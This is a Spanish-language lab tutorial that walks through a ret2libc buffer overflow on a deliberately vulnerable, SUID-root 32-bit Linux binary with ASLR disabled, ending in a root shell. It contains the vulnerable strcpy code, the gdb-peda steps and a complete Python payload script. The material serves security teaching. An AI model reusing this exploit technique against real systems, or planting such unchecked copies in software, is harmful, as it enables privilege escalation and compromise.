---
title:  "Buffer Overflow 32 Bits Linux (sin ASLR)"
categories: 
  - Buffer Overflow
tags:
  - Buffer Overflow
  - Linux
toc: true
toc_label: "Tabla de contenido"
---
## Entorno
En este caso estaremos explotando un binario vulnerable a buffer overflow en una máquina linux de 32 bits, con el **DEP** `(Data Execution Prevention)` **activado** y el `ASLR` **desactivado**

Necesitaremos:
- Una máquina virtual Ubuntu 14.04.6 LTS de 32 bits.
- GDB-Peda
- Un binario vulnerable
- Desactivar el ASLR

## Creación del binario

En cualquier editor de texto, por ejemplo **nano** copiaremos y pegaremos el siguiente código y lo guardaremos como **buff.c**.

```bash
#include <stdio.h>
#include <string.h>

int vuln(char *str)
{
    char buf[64];
    strcpy(buf,str);
    printf("Cadena: %s\n",buf);
    return 0;
}
int main(int argc, char* argv[])
{
    vuln(argv[1]);
}
```
## Compilación

En este caso vamos a compilar nuestro binario de tal manera que el **DEP** `(Data Execution Prevention)` este **activado**, esto quiere decir que en este binaro **no** seremos capaces de poder inyectar nuestro shellcode dentro de la pila como lo es en el caso del [Stack Based Buffer Overflow](https://hacknotes.github.io/buffer%20overflow/buff32linux/).

**Nota:** Si ejecutamos **file buff** nos dirá que es un binario ejecutable de 32 bits.
{: .notice--danger}

```bash
gcc -fno-stack-protector -m32 buff.c -o buff
```

![CompilaciónBuffLinux32](/assets/images/compilacionBuffLinux32bitsSinAslr.png)

## Permisos

Para obtener una shell como **root** luego de explotar el binario, otorgaremos permisos tal que el binario sea SUID y pertenezca a **root**.

Esto lo tenemos que hacer como el usuario **root**. Luego volveremos a migrar al usuario con pocos privilegios.

Todo esto para ver como siendo un usuario sin privilegios, aprovechándonos de la explotación de este binario seremos capaces de obtener una shell como un usuario privilegiado **(root)**.

```bash
chown root:root buff
chmod +s buff
```

![CompilaciónBuffLinux32](/assets/images/permisosBinarioBuffLinux32.png)

## Desactivar el ASLR

Podemos ejecutar lo siguiente para poder saber si esta o no activado el `ASLR`.

```bash
ldd buff
```

![CompilaciónBuffLinux32](/assets/images/aslrActiveldd.png)

Como podemos ver las direcciones van cambiando, esto significa que el `ASLR` esta **activado**, por lo tanto una vez más como el usuario **root** lo desactivaremos.

Por defecto el valor de **randomize_va_space** es **"2"**.

```sql
cat /proc/sys/kernel/randomize_va_space
echo 0 > /proc/sys/kernel/randomize_va_space
```

Una vez realizado lo anterior el valor de **randomize_va_space** sera **"0"** y la aleatoriedad de las direcciones **(ASLR)** estarán desactivadas.

![CompilaciónBuffLinux32](/assets/images/aslrDesactived.png)

## GDB-Peda

Aquí puedes utilizar **GDB** normal, pero te recomiendo instales **Peda**, ya que esto trae utilidades que nos serán de ayuda para agilizar nuestra explotación.

**Recurso:** [Peda](https://github.com/longld/peda)

**Instalación:**

```python
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
echo "DONE! debug your program with gdb and enjoy"
```
Una vez lo instales, al ejecutar **gdb**, debería aparecerte en rojo **gdb-peda$** como lo podemos observar en la imagen de la derecha.

![gdbVSpeda](/assets/images/installPeda.png)

Comandos que utilizaremos:

**1.** Ver los registros de la memoria.
```bash
i r
```

**2.** Crear cadenas aleatorias, en donde **"x"** es el número de la longitud de nuestra cadena.
```bash
pattern arg x
```

**3.** Ejecuta el binario.
```bash
r
```

**4.** Encuentra el tamaño del offset.
```bash
pattern search
```

**5.** Muestra la dirección de `system`.
```bash
p system
```

**6.** Muestra la dirección de `exit`.
```bash
p exit
```

**7.** Muestra la dirección de `/bin/sh`.
```bash
find "/bin/sh" all
```

## Explotación

Lo que hace nuestro binario es recibir una cadena y luego imprimirla por pantalla.

Pero ¿Que pasaría si la cadena que le pasamos supera el tamaño de **buffer** que definimos en nuestro binario?.

Es ahí cuando abra un desbordamiento del buffer.

![Segmentation Fault](/assets/images/segmentationFault.png)

Para este paso puedes hacerlo manual como podemos observar en la imagen anterior o con python e ir probando con un número de caracteres aleatorios hasta ver en que punto se desborda el buffer.

```python
./buff $(python -c 'print "A"*10')
./buff $(python -c 'print "A"*100')
```

![Segmentation Fault](/assets/images/segmentationFaultPython.png)

Lo bueno de **Peda** es que también admite ejecución en python y aparte con sus utilidades seremos capaces de encontrar más fácilmente el offset y controlar el **EIP**.

![Segmentation Fault](/assets/images/segmentationFaultPeda.png)

**Nota:**
Hay que tomar en cuenta que para este caso, repito, **NO** podremos ejecutar nuestro shellcode en la pila apuntándolo con el EIP, esta vez para poder aprovecharnos del desbordamiento del buffer haremos una llamada al sistema de modo que el EIP contenga valores predeterminados como el de `system`, `exit` y `/bin/sh`, a esto se lo llama `ret2libc attack`.
{: .notice--danger}

### 1. Calculando el offset

- Ejecutaremos gdb pasándole como parámetro nuestro binario.
- Seguido crearemos una cadena aleatoria de 100 caracteres.
- Ejecutamos el binario con la cadena que creamos anteriormente.

```python
gdb buff
pattern arg 100
r
```

![Segmentation Fault](/assets/images/patternCreate.png)

### 2. Controlando el EIP

Gracias a **Peda** este paso es muy fácil, ya que con la cadena creada anteriormente basta con ejecutar el siguiente comando para encontrar el tamaño exacto del **offset** antes de sobre escribir el **EIP**.

```python
pattern search
```

![Segmentation Fault](/assets/images/patternSearch.png)

Como resultado obtenemos **76**, ese sera el número de **"A"** que imprimiremos seguidas de **4 bits** que serán nuestras **"B"**.

Sí como resultado en el **EIP** obtenemos nuestras **"B"** en hexadecimal **(0x42)** significa que tenemos efectivamente el control del **EIP**.

```python
r $(python -c 'print "A"*76 + "B"*4')
```

![Segmentation Fault](/assets/images/eipcontrol.png)

### 3. Encontramos la dirección de system,exit y /bin/sh.

```python
p system
p exit
find "/bin/sh" all
```

![Segmentation Fault](/assets/images/direccionesDelSistema.png)

### 4. Payload Final

Ya como paso final solo debemos unir todos los datos que hemos ido recolectando en los pasos anteriores, tomando en cuenta que usaremos `ret2libc attack`.

- **Offset** = 76 `(multiplicar por "A").`
- **Dirección de system** = 0xb7e53310 `(debe estar en formato Little-Endian)`
- **Dirección de exit** = 0xb7e46260 `(debe estar en formato Little-Endian)`
- **Dirección de /bin/sh** = 0xb7f75d4c `(debe estar en formato Little-Endian)`

```python
payload = offset + system + exit + /bin/sh
$(python -c 'print "A"*76 + "\x10\x33\xe5\xb7" + "\x60\x62\xe4\xb7" + "\x4c\x5d\xf7\xb7"')
```

Si ejecutamos nuestro payload desde `gdb` podemos observar que en efecto nos devuelve nuestra shell, pero en este caso como el usuario con pocos privilegios.

![Shell desde peda](/assets/images/shellPedaSinAslr.png)

Debemos ejecutar directamente el binario que creamos `(buff)` con nuestro payload para obtener nuestra shell como `root`.

![Shell sin ASLR](/assets/images/rootShellSinAslr.png)
	
## Recomendación

En la imagen anterior podemos observar que una vez ejecutamos el binario junto con nuestro payload, recibimos nuestra shell como root, pero también podemos ver en la parte inferior que pasándole un script en python, obtenemos el mismo resultado, de hecho este script lo que nos permite es evitarnos pasar manualmente nuestra dirección de memoria a formato **Little-Endian**, ya que esto puede ocasionar errores.

Para evitar eso el script utiliza la librería `pack` que permite pasar la dirección de memoria a formato **Little-Endian** de forma automática.

```python
#/usr/bin/python2

from struct import pack

offset = 76

systemAdd = pack("<I", 0xb7e53310)
exitAdd = pack("<I", 0xb7e46260)
binshAdd = pack("<I", 0xb7f75d4c)

junk = "A"*76

payload = junk + systemAdd + exitAdd + binshAdd

print payload
```
